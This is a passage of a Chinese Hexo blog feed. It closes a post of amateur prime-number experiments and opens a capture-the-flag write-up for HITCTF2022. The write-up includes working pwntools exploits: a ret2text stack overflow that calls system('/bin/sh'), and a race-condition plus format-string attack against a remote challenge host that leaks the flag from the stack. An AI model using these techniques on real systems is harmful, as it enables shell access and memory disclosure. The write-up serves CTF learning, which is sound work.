&amp;&amp; arr[i]&lt;=num+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        k++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,arr[i]);</span><br><span class="line">        <span class="keyword">if</span>(k%<span class="number">15</span>==<span class="number">0</span>)<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0~%d 中有 %d 个 [2,3,6n-1,6n+1] 数组数&quot;</span>,num,k);</span><br><span class="line">    <span class="comment">//--/结果：0~16384 中有 4370 个 [2,3,6n-1,6n+1] 数/--//</span></span><br><span class="line">    <span class="comment">//--/行不通，不试了/--//</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="三、素数的性质总结及其他"><a href="#三、素数的性质总结及其他" class="headerlink" title="三、素数的性质总结及其他"></a>三、素数的性质总结及其他</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2 ^ 1  ~  2 ^ 2  有 2  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 2  ~  2 ^ 3  有 2  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 3  ~  2 ^ 4  有 2  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 4  ~  2 ^ 5  有 5  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 5  ~  2 ^ 6  有 7  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 6  ~  2 ^ 7  有 13  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 7  ~  2 ^ 8  有 23  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 8  ~  2 ^ 9  有 43  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 9  ~  2 ^ 10  有 75  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 10  ~  2 ^ 11  有 137  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 11  ~  2 ^ 12  有 255  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 12  ~  2 ^ 13  有 464  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 13  ~  2 ^ 14  有 872  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 14  ~  2 ^ 15  有 1612  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 15  ~  2 ^ 16  有 3030  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 16  ~  2 ^ 17  有 5709  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 17  ~  2 ^ 18  有 10749  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 18  ~  2 ^ 19  有 20390  个质数</span></span><br><span class="line"><span class="comment"># 2 ^ 19  ~  2 ^ 20  有 38635  个质数</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2   / 5  = 0.4</span></span><br><span class="line"><span class="comment"># 5   / 7  = 0.7142857...(142857为循环数)</span></span><br><span class="line"><span class="comment"># 7   / 13  = 0.538461...(153846为循环数)</span></span><br><span class="line"><span class="comment"># 13  / 23  = 0.5652173913043478260869...(5652173913043478260869为循环数)</span></span><br><span class="line"><span class="comment"># 23  / 43  = 0.534883720930232558139...(534883720930232558139为循环数)</span></span><br><span class="line"><span class="comment"># 43  / 75  = 0.573333333...(75是非质数，3为循环数)</span></span><br><span class="line"><span class="comment"># 43  / 137  = 0.31386861...(13138686为循环数) </span></span><br><span class="line"><span class="comment"># 75  / 137  = 0.547445255...(47445255为循环数)</span></span><br><span class="line"><span class="comment"># 137 / 255  = 0.5372549019607843137(255是非质数，2549019607843137为循环数)</span></span><br><span class="line"><span class="comment"># 137 / 464  = 0.29525862068965517241379310344828...(464是偶数，win10自带计算器只能算到这一位，不知道是否存在循环) </span></span><br><span class="line"><span class="comment"># 137 / 872  = 0.15711009174311926605504587155963...(872是偶数，win10自带计算器只能算到这一位，不知道是否存在循环)</span></span><br><span class="line"><span class="comment"># 137 / 1612 = 0.08498759305210918114143920595533...(1612是偶数，不知道是否存在循环)</span></span><br><span class="line"><span class="comment"># 137 / 3030 = 0.04521452...(3030是偶数，1452是循环数)</span></span><br><span class="line"><span class="comment"># 1612/ 3030 = 0.53201...(3201是循环数)</span></span><br><span class="line"><span class="comment"># 137 / 5709 = 0.02399719740760203187948852688737...(5709是非质数，不知道是否存在循环)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 非质数貌似不太友好，下面列出一些质数相除结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">  <span class="comment"># 182593 / 501191 = 0.36431819406174492359200384683683...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 862013 / 1041149 = 0.82794393501794651870193411317688...(观测不出规律)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 50</span></span><br><span class="line">  <span class="comment"># 5437 / 9283 = 0.58569427986642249272864375740601...(观测不出规律)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 200</span></span><br><span class="line">  <span class="comment"># 101 / 1259 = 0.08022239872915011914217633042097...(观测不出规律)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 400</span></span><br><span class="line">  <span class="comment"># 47  / 211  = 0.22274881516587677725118483412322...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 613 / 659  = 0.93019726858877086494688922610015...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 59  / 1129 = 0.0522586359610274579273693534101...(观测不出规律)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 1600</span></span><br><span class="line">  <span class="comment"># 211 / 229  = 0.92139737991266375545851528384279...(观测不出规律)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3200</span></span><br><span class="line">  <span class="comment"># 17  / 47   = 0.36170212765957446808510638297872...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 23  / 29   = 0.79310344827586206896551724137931...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 13  / 61   = 0.21311475409836065573770491803279...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 37  / 67   = 0.55223880597014925373134328358209...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 23  / 89   = 0.25842696629213483146067415730337...(观测不出规律)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># ??? 为什么之前还能找到许多较短的循环数，现在用两个质数相除就找不到了呢</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动寻找</span></span><br><span class="line">  <span class="comment"># 7 / 11 = 0.63636363636363636363636363636364...(计算器算的，末尾会进位，循环数63)</span></span><br><span class="line">  <span class="comment"># 7 / 17 = 0.41176470588235294117647058823529...(循环数4117647058823529)</span></span><br><span class="line">  <span class="comment"># 7 / 19 = 0.36842105263157894736842105263158...(循环数368421052631578947)</span></span><br><span class="line">  <span class="comment"># 7 / 23 = 0.30434782608695652173913043478261...(循环数3043478260869565217391)</span></span><br><span class="line">  <span class="comment"># 7 / 29 = 0.24137931034482758620689655172414...(循环数2413793103448275862068965517)</span></span><br><span class="line">  <span class="comment"># 7 / 31 = 0.22580645161290322580645161290323...(猜测循环数为225806451612903225806451612903)</span></span><br><span class="line">  <span class="comment"># 7 / 37 = 0.18918918918918918918918918918919...(循环数189)</span></span><br><span class="line">    <span class="comment"># 63/189 = 0.33333333333333333333333333333333.(循环数3)</span></span><br><span class="line">  <span class="comment"># 7 / 41 = 0.17073170731707317073170731707317...(循环数17073，最近的一个质数是17077，上一个质数是17053)</span></span><br><span class="line">  <span class="comment"># 7 / 43 = 0.16279069767441860465116279069767...(162790697674418604651)</span></span><br><span class="line">  <span class="comment"># 7 / 47 = 0.1489361702127659574468085106383....(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 53 = 0.13207547169811320754716981132075...(1320754716981)</span></span><br><span class="line">  <span class="comment"># 7 / 59 = 0.11864406779661016949152542372881...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 61 = 0.11475409836065573770491803278689...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 71 = 0.09859154929577464788732394366197...(观测不出规律，开头985 [doge])</span></span><br><span class="line">  <span class="comment"># 7 / 73 = 0.09589041095890410958904109589041...(95890410)</span></span><br><span class="line">  <span class="comment"># 7 / 79 = 0.08860759493670886075949367088608...(8860759493670)</span></span><br><span class="line">  <span class="comment"># 7 / 83 = 0.08433734939759036144578313253012...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 89 = 0.07865168539325842696629213483146...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 97 = 0.07216494845360824742268041237113...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 101 = 0.06930693069306930693069306930693..(6930)</span></span><br><span class="line">  <span class="comment"># 7 / 103 = 0.06796116504854368932038834951456..(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 107 = 0.0654205607476635514018691588785...(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 109 = 0.06422018348623853211009174311927..(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 113 = 0.06194690265486725663716814159292..(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 127 = 0.05511811023622047244094488188976..(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 131 = 0.05343511450381679389312977099237..(观测不出规律)</span></span><br><span class="line">  <span class="comment"># 7 / 137 = 0.05109489051094890510948905109489..(51094890)</span></span><br><span class="line">  <span class="comment"># 7 / 139 = 0.05035971223021582733812949640288..(观测不出规律)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 11 / 19 = 0.57894736842105263157894736842105..(210526315789473684)</span></span><br><span class="line">  <span class="comment"># ......</span></span><br><span class="line">  <span class="comment"># 7  / 19 = 0.36842105263157894736842105263158...(循环数368421052631578947)</span></span><br></pre></td></tr></table></figure><p>启发：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、 似乎(-1,0)∪(0,1)之间的小数可以由(-∞,+∞)的任意两整数两两相除得来(除数大于被除数)</span></span><br><span class="line"><span class="comment"># 2、 如果将(-1,0)∪(0,1)小数域看成是一个小小的原子，那么(-∞,+∞)就好比整个宇宙</span></span><br><span class="line"><span class="comment"># 3、 而将 1、去类比 2、就好像一个小小原子与整个宇宙之间都存在着某种联系，或者说一个原子就包含着一个宇宙</span></span><br></pre></td></tr></table></figure><h3 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^<span class="number">1</span> = <span class="number">1</span>    个正方体： <span class="number">2</span>^<span class="number">3</span>=<span class="number">8</span>个顶点    <span class="number">12</span>条边  <span class="number">6</span>个面</span><br><span class="line"><span class="number">3</span>^<span class="number">3</span> = <span class="number">27</span>   个正方体： <span class="number">4</span>^<span class="number">3</span>=<span class="number">64</span>个顶点   (<span class="number">27</span>*<span class="number">8</span>=<span class="number">216</span>)</span><br><span class="line"><span class="number">5</span>^<span class="number">3</span> = <span class="number">125</span>  个正方体： <span class="number">6</span>^<span class="number">3</span>=<span class="number">216</span>个顶点</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><img src="image-20230305004247556.png" alt="image-20230305004247556"></p><h3 id="3、Tools"><a href="#3、Tools" class="headerlink" title="3、Tools"></a>3、Tools</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">shuzu = []    <span class="comment">#这里填入素数集 例：shuzu = [2,3,5,7,11,13,...,1048573,]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(shuzu))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">for i in range(2,21):</span></span><br><span class="line"><span class="string">    n=0</span></span><br><span class="line"><span class="string">    m=pow(2,i-1)</span></span><br><span class="line"><span class="string">    for j in shuzu:</span></span><br><span class="line"><span class="string">        if(j &lt; m):continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if(j &gt;= m and j &lt; pow(2,i)):</span></span><br><span class="line"><span class="string">            #print(j)</span></span><br><span class="line"><span class="string">            n+=1</span></span><br><span class="line"><span class="string">        if(j&gt;=pow(2,i)):break</span></span><br><span class="line"><span class="string">    print(&quot;2 ^&quot;,i-1,&quot; ~ &quot;,&quot;2 ^&quot;,i,&quot; 有&quot;,n,&quot; 个质数&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">c = int(input(&quot;请输入模数:&quot;))</span></span><br><span class="line"><span class="string">#print(&quot;c=&quot;,c)</span></span><br><span class="line"><span class="string">b = [[i,0]for i in range(0,c+1)]</span></span><br><span class="line"><span class="string">for i in shuzu:</span></span><br><span class="line"><span class="string">    a = i%c</span></span><br><span class="line"><span class="string">    b[a][1] += 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(0,c+1):</span></span><br><span class="line"><span class="string">    if(b[i][1]!=0):</span></span><br><span class="line"><span class="string">        print(b[i])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">arr = [2,3]</span></span><br><span class="line"><span class="string">print(&quot;\n&quot;)</span></span><br><span class="line"><span class="string">print(&quot;5 ^ 0 ~ 5 ^ 1 有 2 个质数&quot;)</span></span><br><span class="line"><span class="string">print(arr)</span></span><br><span class="line"><span class="string">for i in range(2,7):</span></span><br><span class="line"><span class="string">    arr = []</span></span><br><span class="line"><span class="string">    n=0</span></span><br><span class="line"><span class="string">    m=pow(5,i-1)</span></span><br><span class="line"><span class="string">    for j in shuzu:</span></span><br><span class="line"><span class="string">        if(j &lt; m):continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if(j &gt;= m and j &lt; pow(5,i)):</span></span><br><span class="line"><span class="string">            #print(j)</span></span><br><span class="line"><span class="string">            arr.append(j)</span></span><br><span class="line"><span class="string">            n+=1</span></span><br><span class="line"><span class="string">        if(j&gt;=pow(5,i)):break</span></span><br><span class="line"><span class="string">    print(&quot;\n&quot;)</span></span><br><span class="line"><span class="string">    print(&quot;5 ^&quot;,i-1,&quot; ~ &quot;,&quot;5 ^&quot;,i,&quot; 有&quot;,n,&quot; 个质数&quot;)</span></span><br><span class="line"><span class="string">    print(arr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(0,100):</span></span><br><span class="line"><span class="string">    print(&quot;10000000 ÷&quot;,shuzu[i],&quot;=&quot;,10000000/shuzu[i])</span></span><br><span class="line"><span class="string">for i in range(0,100):</span></span><br><span class="line"><span class="string">    print(shuzu[i],&quot;÷&quot;,shuzu[i+1],&quot;=&quot;,shuzu[i]/shuzu[i+1])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">len = int(len(shuzu)/3200)  # 1600 400 200 50 1</span></span><br><span class="line"><span class="string">print(&quot;len =&quot;,len)</span></span><br><span class="line"><span class="string">num1 = random.randint(2,len)</span></span><br><span class="line"><span class="string">num2 = random.randint(2,len)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while(num2==num1):num2 = random.randint(2,len)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(num2&gt;num1):</span></span><br><span class="line"><span class="string">    num3 = shuzu[num1]/shuzu[num2]</span></span><br><span class="line"><span class="string">    print(&quot;num1 =&quot;,shuzu[num1],&quot;\nnum2 =&quot;,shuzu[num2],&quot;\nnum1/num2 =&quot;,num3)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    num3 = shuzu[num2]/shuzu[num1]</span></span><br><span class="line"><span class="string">    print(&quot;num1 =&quot;,shuzu[num1],&quot;\nnum2 =&quot;,shuzu[num2],&quot;\nnum2/num1 =&quot;,num3)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4、RSA"><a href="#4、RSA" class="headerlink" title="4、RSA"></a>4、RSA</h3><p>RSA加密中使用到的大质数并不是实实在在地算出了1024个bit位的质数，而是随机选中一个最高bit位为1的奇数，然后对这个数进行 <strong>素性检测</strong> 倘若这个数过了5-10轮素性检测，那么就用它作为RSA加密中的一个基本素数，<strong>所以通过这种方法得到的数可能不是素数(个人观点)</strong> </p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/450180396">RSA —— 经典的非对称加密算法 - 知乎 (zhihu.com)</a></p><p>参考链接：<a href="https://zhuanlan.zhihu.com/p/220203643">算法学习笔记(48): 米勒-拉宾素性检验 - 知乎 (zhihu.com)</a></p><p>参考链接：<a href="https://www.zhihu.com/question/293656940">用于加密的超大素数是怎么得到的？ - 知乎 (zhihu.com)</a></p>]]></content>
    
    
    <summary type="html">密码学</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>安天杯-HITCTF2022</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/11/30/%E5%AE%89%E5%A4%A9%E6%9D%AF-HITCTF2022/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/11/30/%E5%AE%89%E5%A4%A9%E6%9D%AF-HITCTF2022/</id>
    <published>2022-11-30T03:23:15.000Z</published>
    <updated>2023-03-11T10:09:08.279Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret2text,条件竞争,一字节溢出</span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line"></span><br><span class="line">C:\blog\source\_posts\安天杯-HITCTF2022\</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn-easy-pwn1-ret2text"><a href="#pwn-easy-pwn1-ret2text" class="headerlink" title="pwn_easy(pwn1:ret2text)"></a>pwn_easy(pwn1:ret2text)</h3><p><strong>1、分析程序逻辑</strong></p><p><img src="image-20221201163200300.png" alt="image-20221201163200300"></p><p>main函数调用func，传入a1值-559038737，func函数中若a1为-889275714则可进入password函数，可以看到func中的gets、password中的read都是溢出点</p><p>结合二进制文件自带的system函数与/bin/sh字符串即可getshell</p><p><img src="image-20221201164402868.png" alt="image-20221201164402868"></p><p><strong>2、exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&quot;i386&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;pwn_easy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_plt = <span class="number">0x080490E0</span>  </span><br><span class="line">bin_sh = <span class="number">0x0804a008</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">40</span>*<span class="string">&#x27;a&#x27;</span> </span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload += p32(sys_plt)    <span class="comment"># ret</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>) <span class="comment"># 修改a1,这里是为了进入password函数</span></span><br><span class="line">                           <span class="comment"># 但进不进不重要，我打的是func里的gets函数</span></span><br><span class="line">payload += p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Please input your username:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br/><br/><h3 id="time-pwn2-条件竞争"><a href="#time-pwn2-条件竞争" class="headerlink" title="time(pwn2:条件竞争)"></a>time(pwn2:条件竞争)</h3><p><strong>1、程序逻辑分析</strong></p><p><img src="image-20221201172741566.png" alt="image-20221201172741566"></p><p><img src="image-20221201184103971.png" alt="image-20221201184103971"></p><p>以上分析中我们可以看出 check_file_name 函数中的 is_secret_file 是全局变量，所有子线程都会访问并改变该变量。现考虑以下条件竞争情况：</p><p><img src="image-20221201194409238.png" alt="image-20221201194409238"></p><p>线程1本来a1为1，is_secret_file为1，file_name为”flag.txt”，是不满足进入dispaly_file_content()这一 分支中的。但是由于有多个线程，且is_secret_file是共享变量。如果线程2此时正好运行到将 is_secret_file赋值为0这里。当再次切换回到线程1时，由于is_secret_file为0，进入 dispaly_file_content()这一分支。此时就会读取”flag.txt”继续处理。</p><p> 虽然直接打印出来的内容是MD5哈希过的，根据这个内容无法恢复出原本的flag内容</p><p>但是，在dispaly_file_content()函数中，可以看到会将flag.txt的内容拷贝到栈上</p><p><img src="image-20221201195117932.png" alt="image-20221201195117932"></p><p>于是结合初始的输入的全局变量值 gloabl_name 处存在的格式化字符串漏洞将栈上的信息打印出来(%p)</p><p><img src="image-20221201195550630.png" alt="image-20221201195550630"></p><p><strong>2、exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"># context(arch=&quot;i386&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;,log_level=&quot;error&quot;)</span><br><span class="line"># io = process(&#x27;./time&#x27;)</span><br><span class="line">io = remote(&quot;122.114.225.151&quot;,10000)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;Who are you?&quot;,b&quot;%p &quot;*80) # gloabl_name</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;2.old_flag.txt&quot;,b&quot;1&quot;) # check_file_name()</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">io.sendline(b&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">io.recvuntil(&quot;2.old_flag.txt&quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.sendline(b&quot;1&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="image-20221201200646593.png" alt="image-20221201200646593"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#解析脚本</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">a = [0x3032465443544948, 0x2d656d69747b3232, 0x6c69662d612d7369,0x772d746168742d65, 0x646e612d73726165, 0x6e2d73656b616d2d, 0x7d6573696f6e2d6f,0xa]</span><br><span class="line"></span><br><span class="line">result = b&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in a:</span><br><span class="line">    result += p64(i)</span><br><span class="line">    </span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><img src="image-20221201201025443.png" alt="image-20221201201025443"></p><br/><br/><h3 id="doc-pwn3-一字节溢出"><a 